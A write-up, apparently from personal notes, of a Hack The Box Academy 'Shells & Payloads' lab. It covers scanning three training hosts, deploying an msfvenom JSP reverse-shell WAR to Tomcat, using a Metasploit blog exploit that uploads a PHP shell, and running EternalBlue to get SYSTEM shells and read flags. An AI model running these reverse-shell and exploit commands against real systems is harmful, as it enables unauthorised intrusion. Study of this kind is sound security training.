From [Shells & Payloads](./Shells%20&%20Payloads.md)

Here we are. It’s the big day and time to start our engagement. We need to put our new skills with crafting and delivering payloads, acquiring and interacting with a shell on Windows and Linux, and how to take over a Web application to the test. Complete the objectives below to finish the engagement.
# Scenario

CAT5's team has secured a foothold into Inlanefreight's network for us. Our responsibility is to examine the results from the recon that was run, validate any info we deem necessary, research what can be seen, and choose which exploit, payloads, and shells will be used to control the targets. Once on the VPN or from your `Pwnbox`, we will need to `RDP` into the foothold host and perform any required actions from there. Below you will find any credentials, IP addresses, and other info that may be required.
## Objectives

- Demonstrate your knowledge of exploiting and receiving an interactive shell from a `Windows host or server`.
- Demonstrate your knowledge of exploiting and receiving an interactive shell from a `Linux host or server`.
- Demonstrate your knowledge of exploiting and receiving an interactive shell from a `Web application`.
- Demonstrate your ability to identify the `shell environment` you have access to as a user on the victim host.

Complete the objectives by answering the challenge questions.
## Credentials

- `Username` == htb-student
- `Password` == HTB_@cademy_stdnt!

Hosts 1-3 will be your targets for this skills challenge. Each host has a unique vector to attack and may even have more than one route built-in. The challenge questions below can be answered by exploiting these three hosts. Gain access and enumerate these targets. You will need to utilize the Foothold PC provided. The IP will appear when you spawn the targets. Attempting to interact with the targets from anywhere other than the foothold will not work. Keep in mind that the Foothold host has access to the Internal inlanefreight network (`172.16.0.0/23` network) so you may want to pay careful attention to the IP address you pick when starting your listeners.

---
# Foothold Enumeration
## XfreeRDP3

We can use  [XfreeRDP3](../../../3%20-%20Tags/Hacking%20Tools/XfreeRDP3.md)  with the credentials to access:

```bash
xfreerdp3 /u:htb-student /p:"HTB_@cademy_stdnt!" /v:foothold.htb
```
## Enumeration

```bash
┌─[htb-student@skills-foothold]─[~]
└──╼ $hostnamectl
   Static hostname: skills-foothold
         Icon name: computer-vm
           Chassis: vm
        Machine ID: fb3f28e31ca3465ab3c26042b0635efe
           Boot ID: 016b551f201c4fdbb91458504c2a17ad
    Virtualization: vmware
  Operating System: Parrot OS 4.11
            Kernel: Linux 5.10.0-8parrot1-amd64
      Architecture: x86-64
```

We can access `/home/administrator`:

```bash
┌─[htb-student@skills-foothold]─[/home/administrator]
└──╼ $ls
Desktop    Downloads  Music     Public     Videos
Documents  hosts.bak  Pictures  Templates

┌─[htb-student@skills-foothold]─[/home/administrator]
└──╼ $cat hosts.bak 
# Host addresses
127.0.0.1  localhost
127.0.1.1  mythic-test
::1        localhost ip6-localhost ip6-loopback
ff02::1    ip6-allnodes
ff02::2    ip6-allrouters
10.129.42.197:8080  dev.inlanefreight.local
10.129.42.197  status.inlanefreight.local
10.129.201.56  blog.inlanefreight.local
10.129.201.54  oracle.inlanefreight.local

──╼ $cd Desktop/
┌─[htb-student@skills-foothold]─[/home/administrator/Desktop]
└──╼ $ls
access-creds.txt  README.license

└──╼ $cat access-creds.txt 
to manage the blog:
- admin / HTB{{REDACTED_PASSWD}}  ( keep it simple for the new admins )

to manage Tomcat on apache
- tomcat / HTB{{REDACTED_PASSWD}} 

Change the passwords soon..
```

Tomcat on apache:   tomcat / Tomcatadm

Internal hosts scan:
```bash
┌─[root@skills-foothold]─[/]
└──╼ #cat /etc/hosts
# Host addresses
127.0.0.1  localhost
127.0.1.1  skills-foothold
::1        localhost ip6-localhost ip6-loopback
ff02::1    ip6-allnodes
ff02::2    ip6-allrouters
172.16.1.11  status.inlanefreight.local
172.16.1.12  blog.inlanefreight.local
10.129.201.134  lab.inlanefreight.local


┌─[root@skills-foothold]─[/]
└──╼ # nmap -sV 172.16.1.11 172.16.1.12
Starting Nmap 7.92 ( https://nmap.org ) at 2026-11-15 08:30 EST
Nmap scan report for status.inlanefreight.local (172.16.1.11)
Host is up (0.19s latency).
Not shown: 989 closed tcp ports (reset)
PORT     STATE SERVICE       VERSION
80/tcp   open  http          Microsoft IIS httpd 10.0
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds  Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
515/tcp  open  printer       Microsoft lpd
1801/tcp open  msmq?
2103/tcp open  msrpc         Microsoft Windows RPC
2105/tcp open  msrpc         Microsoft Windows RPC
2107/tcp open  msrpc         Microsoft Windows RPC
3389/tcp open  ms-wbt-server Microsoft Terminal Services
8080/tcp open  http          Apache Tomcat 10.0.11
```

`status.inlanefreight.local`  172.16.1.11

```bash
┌─[root@skills-foothold]─[/home/administrator]
└──╼ #nmap -sT -sC -sV -A -F 172.16.1.11
Starting Nmap 7.92 ( https://nmap.org ) at 2026-11-15 09:18 EST
Stats: 0:00:19 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
NSE Timing: About 0.00% done
Nmap scan report for status.inlanefreight.local (172.16.1.11)
Host is up (0.0024s latency).
Not shown: 93 closed tcp ports (conn-refused)
PORT     STATE SERVICE       VERSION
80/tcp   open  http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Inlanefreight Server Status
| http-methods: 
|_  Potentially risky methods: TRACE
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds  Windows Server 2019 Standard 17763 microsoft-ds
515/tcp  open  printer       Microsoft lpd
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| ssl-cert: Subject: commonName=shells-winsvr
| Not valid before: 2026-11-14T12:30:39
|_Not valid after:  2027-05-16T12:30:39
|_ssl-date: 2026-11-15T15:18:36+00:00; +59m56s from scanner time.
| rdp-ntlm-info: 
|   Target_Name: SHELLS-WINSVR
|   NetBIOS_Domain_Name: SHELLS-WINSVR
|   NetBIOS_Computer_Name: SHELLS-WINSVR
|   DNS_Domain_Name: shells-winsvr
|   DNS_Computer_Name: shells-winsvr
|   Product_Version: 10.0.17763
|_  System_Time: 2026-11-15T15:18:31+00:00
8080/tcp open  http          Apache Tomcat 10.0.11
|_http-open-proxy: Proxy might be redirecting requests
|_http-favicon: Apache Tomcat
|_http-title: Apache Tomcat/10.0.11
MAC Address: 00:50:56:8A:A1:47 (VMware)
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.92%E=4%D=11/15%OT=80%CT=7%CU=36528%PV=Y%DS=1%DC=D%G=Y%M=005056%
OS:TM=6AF9BF40%P=x86_64-pc-linux-gnu)SEQ(SP=105%GCD=1%ISR=10D%TI=I%CI=I%II=
OS:I%SS=S%TS=U)OPS(O1=M5B4NW8NNS%O2=M5B4NW8NNS%O3=M5B4NW8%O4=M5B4NW8NNS%O5=
OS:M5B4NW8NNS%O6=M5B4NNS)WIN(W1=FFFF%W2=FFFF%W3=FFFF%W4=FFFF%W5=FFFF%W6=FF7
OS:0)ECN(R=Y%DF=Y%T=80%W=FFFF%O=M5B4NW8NNS%CC=Y%Q=)T1(R=Y%DF=Y%T=80%S=O%A=S
OS:+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=0%Q=
OS:)T5(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=80%W=0%S=A%
OS:A=O%F=R%O=%RD=0%Q=)T7(R=N)U1(R=Y%DF=N%T=80%IPL=164%UN=0%RIPL=G%RID=G%RIP
OS:CK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=80%CD=Z)

Network Distance: 1 hop
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 2h35m56s, deviation: 3h34m40s, median: 59m55s
| smb-os-discovery: 
|   OS: Windows Server 2019 Standard 17763 (Windows Server 2019 Standard 6.3)
|   Computer name: shells-winsvr
|   NetBIOS computer name: SHELLS-WINSVR\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2026-11-15T07:18:31-08:00
| smb2-time: 
|   date: 2026-11-15T15:18:31
|_  start_date: N/A
|_nbstat: NetBIOS name: SHELLS-WINSVR, NetBIOS user: <unknown>, NetBIOS MAC: 00:50:56:8a:a1:47 (VMware)
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)

TRACEROUTE
HOP RTT     ADDRESS
1   2.37 ms status.inlanefreight.local (172.16.1.11)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 24.86 seconds
```

**What is the hostname of Host-1? (Format: all lower case)**:       `SHELLS-WINSVR`

---
# Exploit Host1

Submit the name of the folder located in C:\Shares\

`status.inlanefreight.local` |  `172.16.1.11`                    

```bash
└──╼ #ip a
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: ens192: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc mq state UP group default qlen 1000
    link/ether 00:50:56:8a:39:09 brd ff:ff:ff:ff:ff:ff
    altname enp11s0
    inet 10.129.204.126/16 brd 10.129.255.255 scope global dynamic ens192
       valid_lft 3484sec preferred_lft 3484sec
    inet6 dead:beef::250:56ff:fe8a:3909/64 scope global dynamic mngtmpaddr 
       valid_lft 86398sec preferred_lft 14398sec
    inet6 fe80::250:56ff:fe8a:3909/64 scope link 
       valid_lft forever preferred_lft forever
3: ens224: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc mq state UP group default qlen 1000
    link/ether 00:50:56:8a:b1:70 brd ff:ff:ff:ff:ff:ff
    altname enp19s0
    inet 172.16.1.5/23 brd 172.16.1.255 scope global ens224
       valid_lft forever preferred_lft forever
    inet6 fe80::250:56ff:fe8a:b170/64 scope link 
       valid_lft forever preferred_lft forever
4: docker0: <NO-CARRIER,BROADCAST,MULTICAST,UP> mtu 1500 qdisc noqueue state DOWN group default 
    link/ether 02:42:ff:66:63:46 brd ff:ff:ff:ff:ff:ff
    inet 172.17.0.1/16 brd 172.17.255.255 scope global docker0
       valid_lft forever preferred_lft forever

```

## SSH

We can use [SSH](../../../3%20-%20Tags/Hacking%20Concepts/SSH.md) to access:

```bash
┌─[htb-student@skills-foothold]─[~]
└──╼ $sudo systemctl start ssh
```

From our machine:

```bash
┌──(mdn0x㉿mdn0xKali)-[~]
└─$ ssh htb-student@foothold.htb  

┌─[root@skills-foothold]─[/]
└──╼ #systemctl start apache2.service  

└──╼#ss -tulnp

```

http://176.16.1.11:8080/   Exposing:

```bash
sudo socat TCP-LISTEN:9000,reuseaddr,fork TCP:172.16.1.11:8080 &
```
 
![Pasted image 20261115182940.png](../../../2%20-%20Resources/Others/Flameshots/Pasted%20image%2020261115182940.png)

```bash
┌──(mdn0x㉿mdn0xKali)-[~/HTB/Academy/Shells_Payloads]
└─$ msfvenom -p java/jsp_shell_reverse_tcp LHOST=172.16.1.5 LPORT=4444 -f war -o win.war
Payload size: 1090 bytes
Final size of war file: 1090 bytes
Saved as: win.war
```

Click on `Host Manager` and login with the found credentials: 

Upload and Deploy:

![Pasted image 20261115184114.png](../../../2%20-%20Resources/Others/Flameshots/Pasted%20image%2020261115184114.png)

Open listener with [Netcat](../../../3%20-%20Tags/Hacking%20Tools/Netcat.md) on [SSH](../../../3%20-%20Tags/Hacking%20Concepts/SSH.md):

```bash
┌─[root@skills-foothold]─[/]
└──╼ #nc -lvnp 4444
listening on [any] 4444 ...

```

Catch the [Reverse Shell](../../../3%20-%20Tags/Hacking%20Concepts/Reverse%20Shell.md) on  http://10.129.194.23:9000/win:

```bash
C:\Program Files (x86)\Apache Software Foundation\Tomcat 10.0>whoami
whoami
nt authority\local service

C:\Shares>dir 
dir
 Volume in drive C has no label.
 Volume Serial Number is 2683-3D37

 Directory of C:\Shares

09/22/2021  12:22 PM    <DIR>          .
09/22/2021  12:22 PM    <DIR>          ..
09/22/2021  12:24 PM    <DIR>          dev-share
               0 File(s)              0 bytes
               3 Dir(s)  26,680,487,936 bytes free
```

`dev-share`

---
# Exploit Host2
## Question 3

What distribution of Linux is running on Host-2? (Format: distro name, all lower case)           `Ubuntu`

```bash
nmap -A -v -sT -sC -sV -O -p80 172.16.1.12 

PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Inlanefreight Gabber
| http-robots.txt: 1 disallowed entry 
```
## Exposing

```
┌─[✗]─[root@skills-foothold]─[/]
└──╼ #socat TCP-LISTEN:9090,reuseaddr,fork TCP:172.16.1.12:80 &
[2] 3333
```

What language is the shell written in that gets uploaded when using the 50064.rb exploit?
`php`

Exploit the blog site and establish a shell session with the target OS. Submit the contents of `/customscripts/flag.txt`

We search for `50064` in [Metasploit-Framework (MSF)](../../../3%20-%20Tags/Hacking%20Tools/Metasploit-Framework%20(MSF).md) and use it:

```
[msf](Jobs:0 Agents:0) >> cp /home/administrator/Downloads/50064.rb /usr/share/metasploit-framework/modules/exploits

[msf](Jobs:0 Agents:0) >> search 50064
[-] No results from search
[msf](Jobs:0 Agents:0) >> reload_all

msf](Jobs:0 Agents:0) >> search 50064

Matching Modules
================

   #  Name           Disclosure Date  Rank       Check  Description
   -  ----           ---------------  ----       -----  -----------
   0  exploit/50064  2018-12-19       excellent  No     Lightweight facebook-styled blog authenticated remote code execution


Interact with a module by name or index. For example info 0, use 0 or use exploit/50064

[msf](Jobs:0 Agents:0) >> use 0
[*] Using configured payload php/meterpreter/bind_tcp
[msf](Jobs:0 Agents:0) exploit(50064) >> set lhost 172.16.1.5 
lhost => 172.16.1.5
[msf](Jobs:0 Agents:0) exploit(50064) >> set rhosts 172.16.1.12 
rhosts => 172.16.1.12

[msf](Jobs:0 Agents:0) exploit(50064) >> set username admin
username => admin
[msf](Jobs:0 Agents:0) exploit(50064) >> set password admin123!@#
password => admin123!@#
[msf](Jobs:0 Agents:0) exploit(50064) >> set vhost blog.inlanefreight.local
vhost => blog.inlanefreight.local

[*] Got CSRF token: 9acabeaaf2
[*] Logging into the blog...
[+] Successfully logged in with admin
[*] Uploading shell...
[+] Shell uploaded as data/i/4Wlq.php
[+] Payload successfully triggered !
[*] Started bind TCP handler against 172.16.1.12:4444
[*] Sending stage (39282 bytes) to 172.16.1.12
[*] Meterpreter session 1 opened (0.0.0.0:0 -> 172.16.1.12:4444) at 2026-11-15 14:03:51 -0500

(Meterpreter 1)(/var/www/blog.inlanefreight.local/data/i) > shell
Process 1635 created.
Channel 0 created.
whoami
www-data

cat /customscripts/flag.txt
HTB{{REDACTED_FLAG}}
```

---
# Enumeration Host3

```bash
┌─[✗]─[root@skills-foothold]─[/]
└──╼ #nmap -A -F -O -v -sV -sC 172.16.1.13

Discovered open port 135/tcp on 172.16.1.13
Discovered open port 445/tcp on 172.16.1.13
Discovered open port 80/tcp on 172.16.1.13
Discovered open port 139/tcp on 172.16.1.13

PORT    STATE SERVICE      VERSION
80/tcp  open  http         Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-title: 172.16.1.13 - /
135/tcp open  msrpc        Microsoft Windows RPC
139/tcp open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp open  microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds

Host script results:
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required
|_clock-skew: mean: 2h39m58s, deviation: 4h37m08s, median: -2s
| nbstat: NetBIOS name: SHELLS-WINBLUE, NetBIOS user: <unknown>, NetBIOS MAC: 00:50:56:8a:9e:7b (VMware)
| Names:
|   SHELLS-WINBLUE<00>   Flags: <unique><active>
|   WORKGROUP<00>        Flags: <group><active>
|_  SHELLS-WINBLUE<20>   Flags: <unique><active>
| smb2-time: 
|   date: 2026-11-15T18:26:50
|_  start_date: 2026-11-15T16:49:23
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb-os-discovery: 
|   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)
|   Computer name: SHELLS-WINBLUE
|   NetBIOS computer name: SHELLS-WINBLUE\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2026-11-15T10:26:50-08:00
```

What is the hostname of Host-3?    `SHELLS-WINBLUE`
## Exploit Host3

Exploit and gain a shell session with Host-3. Then submit the contents of C:\Users\Administrator\Desktop\Skills-flag.txt

Expose from [ssh](../../../3%20-%20Tags/Hacking%20Concepts/SSH.md) session:

```
┌─[root@skills-foothold]─[/]
└──╼ #socat TCP-LISTEN:9080,reuseaddr,fork TCP:172.16.1.13:80 &
[3] 3457
```

![Pasted image 20261115193255.png](../../../2%20-%20Resources/Others/Flameshots/Pasted%20image%2020261115193255.png)

We can craft a `.aspx` payload for a [Shell](../../../3%20-%20Tags/Hacking%20Concepts/Shell.md):

```bash
┌─[root@skills-foothold]─[/]
└──╼ #nc -lvnp 1337
listening on [any] 1337 ...

c:\Users>cd Administrator
cd Administrator
Access is denied.
```

The box is running Windows Server 2016 and it's also vulnerable to `EternalBlue`:

```bash
[msf](Jobs:0 Agents:0) >> use exploit/windows/smb/ms17_010_psexec

[msf](Jobs:0 Agents:0) exploit(windows/smb/ms17_010_psexec) >> set lhost 172.16.1.5
lhost => 172.16.1.5
[msf](Jobs:0 Agents:0) exploit(windows/smb/ms17_010_psexec) >> set rhosts 172.16.1.13
rhosts => 172.16.1.13
[msf](Jobs:0 Agents:0) exploit(windows/smb/ms17_010_psexec) >> run

(Meterpreter 1)(C:\Windows\system32) > shell
Process 2340 created.
Channel 1 created.
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.

C:\Windows\system32>type C:\Users\Administrator\Desktop\Skills-flag.txt
HTB{{REDACTED_FLAG}}
```